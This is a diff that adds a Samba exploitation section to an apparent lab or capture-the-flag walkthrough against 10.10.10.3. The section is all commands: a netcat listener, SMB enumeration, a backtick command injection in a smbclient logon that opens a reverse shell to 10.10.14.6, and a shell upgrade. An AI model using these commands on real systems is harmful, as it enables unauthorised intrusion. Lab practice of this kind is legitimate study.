@@ -27,3 +27,21 @@ ls /usr/share/nmap/scripts/ssh*
 ```
 smbclient -L 10.10.10.3
 ```
+
+#   Exploitation #1: Samba
+
+```
+nc -nlvp 4444
+```
+```
+smbmap -H 10.10.10.3
+```
+```
+smbclient //10.10.10.3/tmp
+```
+```
+logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
+```
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")' 
+```
